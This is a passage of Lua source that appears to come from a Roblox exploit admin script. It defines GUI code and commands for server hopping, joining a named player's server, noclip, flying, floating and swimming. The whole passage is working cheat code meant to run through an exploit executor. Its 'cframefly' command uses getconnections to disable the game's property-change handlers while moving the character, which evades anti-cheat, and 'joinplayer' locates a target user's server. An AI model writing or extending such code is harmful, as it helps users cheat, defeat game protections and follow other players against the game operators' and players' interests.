			shadow.BorderSizePixel = 0
			shadow.Size = UDim2.new(0, 250, 0, 20)
			shadow.ZIndex = 10
			table.insert(shade2,shadow)

			PopupText.Name = "PopupText"
			PopupText.Parent = shadow
			PopupText.BackgroundTransparency = 1
			PopupText.Size = UDim2.new(1, 0, 0.95, 0)
			PopupText.ZIndex = 10
			PopupText.Font = Enum.Font.SourceSans
			PopupText.TextSize = 14
			PopupText.Text = "Server"
			PopupText.TextColor3 = currentText1
			PopupText.TextWrapped = true
			table.insert(text1,PopupText)

			Exit.Name = "Exit"
			Exit.Parent = shadow
			Exit.BackgroundTransparency = 1
			Exit.Position = UDim2.new(1, -20, 0, 0)
			Exit.Size = UDim2.new(0, 20, 0, 20)
			Exit.Text = ""
			Exit.ZIndex = 10

			ExitImage.Parent = Exit
			ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
			ExitImage.BackgroundTransparency = 1
			ExitImage.Position = UDim2.new(0, 5, 0, 5)
			ExitImage.Size = UDim2.new(0, 10, 0, 10)
			ExitImage.Image = "rbxassetid://5054663650"
			ExitImage.ZIndex = 10

			background.Name = "background"
			background.Parent = FRAME
			background.Active = true
			background.BackgroundColor3 = currentShade1
			background.BorderSizePixel = 0
			background.Position = UDim2.new(0, 0, 1, 0)
			background.Size = UDim2.new(0, 250, 0, 250)
			background.ZIndex = 10
			table.insert(shade1,background)

			TextLabel.Name = "Text Label"
			TextLabel.Parent = background
			TextLabel.BackgroundTransparency = 1
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0, 5, 0, 80)
			TextLabel.Size = UDim2.new(0, 100, 0, 20)
			TextLabel.ZIndex = 10
			TextLabel.Font = Enum.Font.SourceSansLight
			TextLabel.TextSize = 20
			TextLabel.Text = "Run Time:"
			TextLabel.TextColor3 = currentText1
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,TextLabel)

			TextLabel2.Name = "Text Label2"
			TextLabel2.Parent = background
			TextLabel2.BackgroundTransparency = 1
			TextLabel2.BorderSizePixel = 0
			TextLabel2.Position = UDim2.new(0, 5, 0, 130)
			TextLabel2.Size = UDim2.new(0, 100, 0, 20)
			TextLabel2.ZIndex = 10
			TextLabel2.Font = Enum.Font.SourceSansLight
			TextLabel2.TextSize = 20
			TextLabel2.Text = "Statistics:"
			TextLabel2.TextColor3 = currentText1
			TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,TextLabel2)

			TextLabel3.Name = "Text Label3"
			TextLabel3.Parent = background
			TextLabel3.BackgroundTransparency = 1
			TextLabel3.BorderSizePixel = 0
			TextLabel3.Position = UDim2.new(0, 5, 0, 10)
			TextLabel3.Size = UDim2.new(0, 100, 0, 20)
			TextLabel3.ZIndex = 10
			TextLabel3.Font = Enum.Font.SourceSansLight
			TextLabel3.TextSize = 20
			TextLabel3.Text = "Local Player:"
			TextLabel3.TextColor3 = currentText1
			TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,TextLabel3)

			Time.Name = "Time"
			Time.Parent = background
			Time.BackgroundTransparency = 1
			Time.BorderSizePixel = 0
			Time.Position = UDim2.new(0, 5, 0, 105)
			Time.Size = UDim2.new(0, 100, 0, 20)
			Time.ZIndex = 10
			Time.Font = Enum.Font.SourceSans
			Time.FontSize = Enum.FontSize.Size14
			Time.Text = "LOADING"
			Time.TextColor3 = currentText1
			Time.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,Time)

			appearance.Name = "appearance"
			appearance.Parent = background
			appearance.BackgroundTransparency = 1
			appearance.BorderSizePixel = 0
			appearance.Position = UDim2.new(0, 5, 0, 55)
			appearance.Size = UDim2.new(0, 100, 0, 20)
			appearance.ZIndex = 10
			appearance.Font = Enum.Font.SourceSans
			appearance.FontSize = Enum.FontSize.Size14
			appearance.Text = "Appearance: LOADING"
			appearance.TextColor3 = currentText1
			appearance.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,appearance)

			maxplayers.Name = "maxplayers"
			maxplayers.Parent = background
			maxplayers.BackgroundTransparency = 1
			maxplayers.BorderSizePixel = 0
			maxplayers.Position = UDim2.new(0, 5, 0, 175)
			maxplayers.Size = UDim2.new(0, 100, 0, 20)
			maxplayers.ZIndex = 10
			maxplayers.Font = Enum.Font.SourceSans
			maxplayers.FontSize = Enum.FontSize.Size14
			maxplayers.Text = "LOADING"
			maxplayers.TextColor3 = currentText1
			maxplayers.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,maxplayers)

			name.Name = "name"
			name.Parent = background
			name.BackgroundTransparency = 1
			name.BorderSizePixel = 0
			name.Position = UDim2.new(0, 5, 0, 215)
			name.Size = UDim2.new(0, 240, 0, 30)
			name.ZIndex = 10
			name.Font = Enum.Font.SourceSans
			name.FontSize = Enum.FontSize.Size14
			name.Text = "Place Name: LOADING"
			name.TextColor3 = currentText1
			name.TextWrapped = true
			name.TextXAlignment = Enum.TextXAlignment.Left
			name.TextYAlignment = Enum.TextYAlignment.Top
			table.insert(text1,name)

			placeid.Name = "placeid"
			placeid.Parent = background
			placeid.BackgroundTransparency = 1
			placeid.BorderSizePixel = 0
			placeid.Position = UDim2.new(0, 5, 0, 195)
			placeid.Size = UDim2.new(0, 100, 0, 20)
			placeid.ZIndex = 10
			placeid.Font = Enum.Font.SourceSans
			placeid.FontSize = Enum.FontSize.Size14
			placeid.Text = "Place ID: LOADING"
			placeid.TextColor3 = currentText1
			placeid.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,placeid)

			playerid.Name = "playerid"
			playerid.Parent = background
			playerid.BackgroundTransparency = 1
			playerid.BorderSizePixel = 0
			playerid.Position = UDim2.new(0, 5, 0, 35)
			playerid.Size = UDim2.new(0, 100, 0, 20)
			playerid.ZIndex = 10
			playerid.Font = Enum.Font.SourceSans
			playerid.FontSize = Enum.FontSize.Size14
			playerid.Text = "Player ID: LOADING"
			playerid.TextColor3 = currentText1
			playerid.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,playerid)

			players.Name = "players"
			players.Parent = background
			players.BackgroundTransparency = 1
			players.BorderSizePixel = 0
			players.Position = UDim2.new(0, 5, 0, 155)
			players.Size = UDim2.new(0, 100, 0, 20)
			players.ZIndex = 10
			players.Font = Enum.Font.SourceSans
			players.FontSize = Enum.FontSize.Size14
			players.Text = "LOADING"
			players.TextColor3 = currentText1
			players.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,players)

			CopyApp.Name = "CopyApp"
			CopyApp.Parent = background
			CopyApp.BackgroundColor3 = currentShade2
			CopyApp.BorderSizePixel = 0
			CopyApp.Position = UDim2.new(0, 210, 0, 55)
			CopyApp.Size = UDim2.new(0, 35, 0, 20)
			CopyApp.Font = Enum.Font.SourceSans
			CopyApp.TextSize = 14
			CopyApp.Text = "Copy"
			CopyApp.TextColor3 = currentText1
			CopyApp.ZIndex = 10
			table.insert(shade2,CopyApp)
			table.insert(text1,CopyApp)

			CopyPlrID.Name = "CopyPlrID"
			CopyPlrID.Parent = background
			CopyPlrID.BackgroundColor3 = currentShade2
			CopyPlrID.BorderSizePixel = 0
			CopyPlrID.Position = UDim2.new(0, 210, 0, 35)
			CopyPlrID.Size = UDim2.new(0, 35, 0, 20)
			CopyPlrID.Font = Enum.Font.SourceSans
			CopyPlrID.TextSize = 14
			CopyPlrID.Text = "Copy"
			CopyPlrID.TextColor3 = currentText1
			CopyPlrID.ZIndex = 10
			table.insert(shade2,CopyPlrID)
			table.insert(text1,CopyPlrID)

			CopyPlcID.Name = "CopyPlcID"
			CopyPlcID.Parent = background
			CopyPlcID.BackgroundColor3 = currentShade2
			CopyPlcID.BorderSizePixel = 0
			CopyPlcID.Position = UDim2.new(0, 210, 0, 195)
			CopyPlcID.Size = UDim2.new(0, 35, 0, 20)
			CopyPlcID.Font = Enum.Font.SourceSans
			CopyPlcID.TextSize = 14
			CopyPlcID.Text = "Copy"
			CopyPlcID.TextColor3 = currentText1
			CopyPlcID.ZIndex = 10
			table.insert(shade2,CopyPlcID)
			table.insert(text1,CopyPlcID)

			local SINFOGUI = background
			FRAME:TweenPosition(UDim2.new(0.5, -130, 0, 100), "InOut", "Quart", 0.5, true, nil) 
			wait(0.5)
			Exit.MouseButton1Click:Connect(function()
				FRAME:TweenPosition(UDim2.new(0.5, -130, 0, -500), "InOut", "Quart", 0.5, true, nil) 
				wait(0.6)
				FRAME:Destroy()
			end)
			local Asset = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
			SINFOGUI.name.Text = "Place Name: " .. Asset.Name
			SINFOGUI.playerid.Text = "Player ID: " ..speaker.UserId
			SINFOGUI.maxplayers.Text = Players.MaxPlayers.. " Players Max"
			SINFOGUI.placeid.Text = "Place ID: " ..game.PlaceId

			CopyApp.MouseButton1Click:Connect(function()
				toClipboard(speaker.CharacterAppearanceId)
			end)
			CopyPlrID.MouseButton1Click:Connect(function()
				toClipboard(speaker.UserId)
			end)
			CopyPlcID.MouseButton1Click:Connect(function()
				toClipboard(game.PlaceId)
			end)

			repeat
				players = Players:GetPlayers()
				SINFOGUI.players.Text = #players.. " Player(s)"
				SINFOGUI.appearance.Text = "Appearance: " ..speaker.CharacterAppearanceId
				local seconds = math.floor(workspace.DistributedGameTime)
				local minutes = math.floor(workspace.DistributedGameTime / 60)
				local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
				local seconds = seconds - (minutes * 60)
				local minutes = minutes - (hours * 60)
				if hours < 1 then if minutes < 1 then
						SINFOGUI.Time.Text = seconds .. " Second(s)" else
						SINFOGUI.Time.Text = minutes .. " Minute(s), " .. seconds .. " Second(s)"
					end
				else
					SINFOGUI.Time.Text = hours .. " Hour(s), " .. minutes .. " Minute(s), " .. seconds .. " Second(s)"
				end
				wait(1)
			until SINFOGUI.Parent == nil
		end)
	end)

	addcmd('jobid',{},function(args, speaker)
		local jobId = 'Roblox.GameLauncher.joinGameInstance('..game.PlaceId..', "'..game.JobId..'")'
		toClipboard(jobId)
	end)

	addcmd('notifyjobid',{},function(args, speaker)
		notify('JobId / PlaceId',game.JobId..' / '..game.PlaceId)
	end)

	addcmd('breakloops',{'break'},function(args, speaker)
		lastBreakTime = tick()
	end)

	addcmd('gametp',{'gameteleport'},function(args, speaker)
		game:GetService('TeleportService'):Teleport(args[1])
	end)

	addcmd('rejoin',{'rj'},function(args, speaker)
		if #Players:GetPlayers() <= 1 then
			Players.LocalPlayer:Kick("\nRejoining...")
			wait()
			game:GetService('TeleportService'):Teleport(game.PlaceId, Players.LocalPlayer)
		else
			game:GetService('TeleportService'):TeleportToPlaceInstance(game.PlaceId, game.JobId, Players.LocalPlayer)
		end
	end)

	addcmd('autorejoin',{'autorj'},function(args, speaker)
		local Dir = COREGUI:FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
		Dir.DescendantAdded:Connect(function(Err)
			if Err.Name == "ErrorTitle" then
				Err:GetPropertyChangedSignal("Text"):Connect(function()
					if Err.Text:sub(0, 12) == "Disconnected" then
						if #game.Players:GetPlayers() <= 1 then
							game.Players.LocalPlayer:Kick("\nRejoining...")
							wait()
							game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer)
						else
							game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer)
						end
					end
				end)
			end
		end)
		notify('Auto Rejoin','Auto rejoin enabled')
	end)

	addcmd('serverhop',{'shop'},function(args, speaker)
		local x = {}
		for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
				x[#x + 1] = v.id
			end
		end
		if #x > 0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
		else
			return notify("Serverhop","Couldn't find a server.")
		end
	end)

	addcmd('joinplayer',{'joinp'},function(args, speaker)
		local retries = 0
		function ToServer(User,PlaceId)	
			if args[2] == nil then PlaceId = game.PlaceId end
			if not pcall(function()
					local FoundUser, UserId = pcall(function()
						if tonumber(User) then
							return tonumber(User)
						end

						return Players:GetUserIdFromNameAsync(User)
					end)
					if not FoundUser then
						notify('Join Error','Username/UserID does not exist')
					else
						notify('Join Player','Loading servers. Hold on a second.')
						local URL2 = ("https://games.roblox.com/v1/games/"..PlaceId.."/servers/Public?sortOrder=Asc&limit=100")
						local Http = game:GetService("HttpService"):JSONDecode(game:HttpGet(URL2))
						local GUID

						function tablelength(T)
							local count = 0
							for _ in pairs(T) do count = count + 1 end
							return count
						end

						for i=1,tonumber(tablelength(Http.data)) do
							for j,k in pairs(Http.data[i].playerIds) do
								if k == UserId then
									GUID = Http.data[i].id
								end
							end
						end

						if GUID ~= nil then
							notify('Join Player','Joining '..User)
							game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceId,GUID,game.Players.LocalPlayer)
						else
							notify('Join Error','Unable to join user.')
						end
					end
				end)
			then
				if retries < 3 then
					retries = retries + 1
					print('ERROR retrying '..retries..'/3')
					notify('Join Error','Error while trying to join. Retrying '..retries..'/3.')
					ToServer(User,PlaceId)
				else
					notify('Join Error','Error while trying to join.')
				end
			end
		end
		ToServer(args[1],args[2])
	end)

	addcmd('exit',{},function(args, speaker)
		game:shutdown() 
	end)

	local Noclipping = nil
	addcmd('noclip',{},function(args, speaker)
		Clip = false
		wait(0.1)
		local function NoclipLoop()
			if Clip == false and speaker.Character ~= nil then
				for _, child in pairs(speaker.Character:GetDescendants()) do
					if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
						child.CanCollide = false
					end
				end
			end
		end
		Noclipping = game:GetService('RunService').Stepped:Connect(NoclipLoop)
		if args[1] and args[1] == 'nonotify' then return end
		notify('Noclip','Noclip Enabled')
	end)

	addcmd('clip',{'unnoclip'},function(args, speaker)
		if Noclipping then
			Noclipping:Disconnect()
		end
		Clip = true
		if args[1] and args[1] == 'nonotify' then return end
		notify('Noclip','Noclip Disabled')
	end)

	addcmd('togglenoclip',{},function(args, speaker)
		if Clip then
			execCmd('noclip')
		else
			execCmd('clip')
		end
	end)

	FLYING = false
	QEfly = true
	iyflyspeed = 1
	vehicleflyspeed = 1
	function sFLY(vfly)
		repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChild('Humanoid')
		repeat wait() until IYMouse
		if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end

		local T = getRoot(Players.LocalPlayer.Character)
		local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
		local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
		local SPEED = 0

		local function FLY()
			FLYING = true
			local BG = Instance.new('BodyGyro')
			local BV = Instance.new('BodyVelocity')
			BG.P = 9e4
			BG.Parent = T
			BV.Parent = T
			BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			BG.cframe = T.CFrame
			BV.velocity = Vector3.new(0, 0, 0)
			BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
			spawn(function()
				repeat wait()
					if not vfly and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
						Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
					end
					if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
						SPEED = 50
					elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
						SPEED = 0
					end
					if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
						lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
					elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					else
						BV.velocity = Vector3.new(0, 0, 0)
					end
					BG.cframe = workspace.CurrentCamera.CoordinateFrame
				until not FLYING
				CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				SPEED = 0
				BG:Destroy()
				BV:Destroy()
				if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
					Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
				end
			end)
		end
		flyKeyDown = IYMouse.KeyDown:Connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
			elseif KEY:lower() == 's' then
				CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
			elseif KEY:lower() == 'a' then
				CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
			elseif KEY:lower() == 'd' then 
				CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
			elseif QEfly and KEY:lower() == 'e' then
				CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
			elseif QEfly and KEY:lower() == 'q' then
				CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
			end
			pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
		end)
		flyKeyUp = IYMouse.KeyUp:Connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = 0
			elseif KEY:lower() == 's' then
				CONTROL.B = 0
			elseif KEY:lower() == 'a' then
				CONTROL.L = 0
			elseif KEY:lower() == 'd' then
				CONTROL.R = 0
			elseif KEY:lower() == 'e' then
				CONTROL.Q = 0
			elseif KEY:lower() == 'q' then
				CONTROL.E = 0
			end
		end)
		FLY()
	end

	function NOFLY()
		FLYING = false
		if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
		if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
			Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
		end
		pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
	end

	addcmd('fly',{},function(args, speaker)
		NOFLY()
		wait()
		sFLY()
		if args[1] and isNumber(args[1]) then
			iyflyspeed = args[1]
		end
	end)

	addcmd('flyspeed',{'flysp'},function(args, speaker)
		local speed = args[1] or 1
		if isNumber(speed) then
			iyflyspeed = speed
		end
	end)

	addcmd('unfly',{'nofly','novfly','unvehiclefly','novehiclefly','unvfly'},function(args, speaker)
		NOFLY()
	end)

	addcmd('vfly',{'vehiclefly'},function(args, speaker)
		NOFLY()
		wait()
		sFLY(true)
		if args[1] and isNumber(args[1]) then
			vehicleflyspeed = args[1]
		end
	end)

	addcmd('togglevfly',{},function(args, speaker)
		if FLYING then
			NOFLY()
		else
			sFLY(true)
		end
	end)

	addcmd('vflyspeed',{'vflysp','vehicleflyspeed','vehicleflysp'},function(args, speaker)
		local speed = args[1] or 1
		if isNumber(speed) then
			vehicleflyspeed = speed
		end
	end)

	addcmd('qefly',{'flyqe'},function(args, speaker)
		if args[1] == 'false' then
			QEfly = false
		else
			QEfly = true
		end
	end)

	addcmd('togglefly',{},function(args, speaker)
		if FLYING then
			NOFLY()
		else
			sFLY()
		end
	end)

	Con = nil
	SPI = 1 -- studs per interval
	addcmd('cframefly', {'cfly'}, function(args, ME)
		if args[1] and isNumber(args[1]) then
			SPI = args[1]
		end
		local UIS = game:GetService('UserInputService')
		local RunService = game:GetService('RunService')
		local Keys, v3, cf = Enum.KeyCode, Vector3.new(), CFrame.new()
		Con = RunService.Heartbeat:Connect(function()
			local Camera, Cache = workspace.CurrentCamera, {}
			local Human = ME.Character and ME.Character:FindFirstChildWhichIsA('Humanoid')
			local HRP = Human and Human.RootPart or ME.Character.PrimaryPart
			if not ME.Character or not Human or not HRP or not Camera then
				return 
			end
			local Cache = {}
			local Cons = {game.ItemChanged, Human.StateChanged, Human.Changed, ME.Character.Changed}
			for _, v in ipairs(ME.Character:GetChildren()) do
				if v:IsA('BasePart') then
					Cons[#Cons + 1] = v.Changed
					Cons[#Cons + 1] = v:GetPropertyChangedSignal('CFrame')
				end
			end
			for _, v in ipairs(Cons) do
				for _, v1 in ipairs(getconnections(v)) do
					if not rawget(v1, '__OBJECT_ENABLED') then
						Cache[#Cache + 1] = v1
						v1:Disable()
					end
				end
			end
			Human:ChangeState(11)
			HRP.CFrame = CFrame.new(HRP.Position, HRP.Position + Camera.CFrame.LookVector) * (UIS:GetFocusedTextBox() and cf or CFrame.new((UIS:IsKeyDown(Keys.D) and SPI) or (UIS:IsKeyDown(Keys.A) and -SPI) or 0, (UIS:IsKeyDown(Keys.E) and SPI / 2) or (UIS:IsKeyDown(Keys.Q) and -SPI / 2) or 0, (UIS:IsKeyDown(Keys.S) and SPI) or (UIS:IsKeyDown(Keys.W) and -SPI) or 0))
			for _, v in ipairs(Cache) do
				v:Enable()
			end
		end)
	end)

	addcmd('uncframefly',{'uncfly'},function(args, speaker)
		if Con then
			Con:Disconnect()
		end
	end)

	addcmd('cframeflyspeed',{'cflyspeed'},function(args, speaker)
		if isNumber(args[1]) then
			SPI = args[1]
		end
	end)

	Floating = false
	floatName = randomString()
	addcmd('float', {'platform'},function(args, speaker)
		Floating = true
		local pchar = speaker.Character
		if pchar and not pchar:FindFirstChild(floatName) then
			spawn(function()
				local Float = Instance.new('Part')
				Float.Name = floatName
				Float.Parent = pchar
				Float.Transparency = 1
				Float.Size = Vector3.new(6,1,6)
				Float.Anchored = true
				local FloatValue = -3.5
				if r15(speaker) then FloatValue = -3.65 end
				Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
				notify('Float','Float Enabled (Q = down & E = up)')
				qUp = IYMouse.KeyUp:Connect(function(KEY)
					if KEY == 'q' then
						FloatValue = FloatValue + 0.5
					end
				end)
				eUp = IYMouse.KeyUp:Connect(function(KEY)
					if KEY == 'e' then
						FloatValue = FloatValue - 0.5
					end
				end)
				qDown = IYMouse.KeyDown:Connect(function(KEY)
					if KEY == 'q' then
						FloatValue = FloatValue - 0.5
					end
				end)
				eDown = IYMouse.KeyDown:Connect(function(KEY)
					if KEY == 'e' then
						FloatValue = FloatValue + 0.5
					end
				end)
				floatDied = speaker.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
					FloatingFunc:Disconnect()
					Float:Destroy()
					qUp:Disconnect()
					eUp:Disconnect()
					qDown:Disconnect()
					eDown:Disconnect()
					floatDied:Disconnect()
				end)
				local function FloatPadLoop()
					if pchar:FindFirstChild(floatName) and getRoot(pchar) then
						Float.CFrame = getRoot(pchar).CFrame * CFrame.new(0,FloatValue,0)
					else
						FloatingFunc:Disconnect()
						Float:Destroy()
						qUp:Disconnect()
						eUp:Disconnect()
						qDown:Disconnect()
						eDown:Disconnect()
						floatDied:Disconnect()
					end
				end			
				FloatingFunc = game:GetService('RunService').Heartbeat:Connect(FloatPadLoop)
			end)
		end
	end)

	addcmd('unfloat',{'nofloat','unplatform','noplatform'},function(args, speaker)
		Floating = false
		local pchar = speaker.Character
		notify('Float','Float Disabled')
		if pchar:FindFirstChild(floatName) then
			pchar:FindFirstChild(floatName):Destroy()
		end
		if floatDied then
			FloatingFunc:Disconnect()
			qUp:Disconnect()
			eUp:Disconnect()
			qDown:Disconnect()
			eDown:Disconnect()
			floatDied:Disconnect()
		end
	end)

	addcmd('togglefloat',{},function(args, speaker)
		if Floating then
			execCmd('unfloat')
		else
			execCmd('float')
		end
	end)

	swimming = false
	addcmd('swim',{},function(args, speaker)
		workspace.Gravity = 0
		local function swimDied()
			workspace.Gravity = 198.2
			swimming = false
		end
		gravReset = speaker.Character:FindFirstChildOfClass('Humanoid').Died:Connect(swimDied)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
		swimming = true
	end)

	addcmd('unswim',{'noswim'},function(args, speaker)
		workspace.Gravity = 198.2
		swimming = false
		if gravReset then
			gravReset:Disconnect()
		end
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
		speaker.Character.Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
		speaker.Character.Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
	end)

	addcmd('toggleswim',{},function(args, speaker)
		if swimming then
			execCmd('unswim')
		else
			execCmd('swim')
		end
	end)

	addcmd('setwaypoint',{'swp','setwp','spos','saveposition','savepos'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if getRoot(speaker.Character) then
			notify('Modified Waypoints',"Created waypoint: "..getstring(1))
			local torso = getRoot(speaker.Character)
			WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}, GAME = game.PlaceId}
			if AllWaypoints ~= nil then
				AllWaypoints[#AllWaypoints + 1] = {NAME = WPName, COORD = {math.floor(torso.Position.X), math.floor(torso.Position.Y), math.floor(torso.Position.Z)}, GAME = game.PlaceId}
			end
		end	
		refreshwaypoints()
		updatesaves()
	end)

	addcmd('waypointpos',{'wpp','setwaypointposition','setpos','setwaypoint','setwaypointpos'},function(args, speaker)
		local WPName = tostring(getstring(1))
		if getRoot(speaker.Character) then
			notify('Modified Waypoints',"Created waypoint: "..getstring(1))
			WayPoints[#WayPoints + 1] = {NAME = WPName, COORD = {args[2], args[3], args[4]}, GAME = game.PlaceId}
			if AllWaypoints ~= nil then
				AllWaypoints[#AllWaypoints + 1] = {NAME = WPName, COORD = {args[2], args[3], args[4]}, GAME = game.PlaceId}
			end
		end	
		refreshwaypoints()
		updatesaves()
	end)

	waypointParts = {}
	addcmd('showwaypoints',{'showwp','showwps'},function(args, speaker)
		execCmd('hidewaypoints')
		wait()
		for i,_ in pairs(WayPoints) do
			local x = WayPoints[i].COORD[1]
			local y = WayPoints[i].COORD[2]
			local z = WayPoints[i].COORD[3]
			local part = Instance.new("Part")
			part.Size = Vector3.new(5,5,5)
			part.CFrame = CFrame.new(x,y,z)
			part.Parent = workspace
			part.Anchored = true
			part.CanCollide = false
			table.insert(waypointParts,part)
			local view = Instance.new("BoxHandleAdornment")
			view.Adornee = part
			view.AlwaysOnTop = true
			view.ZIndex = 10
			view.Size = part.Size
			view.Parent = part
		end
		for i,v in pairs(pWayPoints) do
